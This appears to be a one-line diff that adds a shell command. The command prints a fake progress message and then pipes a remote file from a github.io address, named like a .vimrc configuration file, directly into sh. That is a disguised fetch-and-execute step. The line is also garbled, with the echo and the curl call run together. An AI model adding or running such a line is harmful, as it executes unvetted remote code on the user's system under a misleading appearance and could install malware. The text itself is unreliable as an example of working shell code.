@@ -1,0 +1,1 @@
+echo Progress: 36.00%curl -L --progress-bar frkns.github.io/fun/GAMECUBE_NEWSPAPER_SIGNING.vimrc | sh
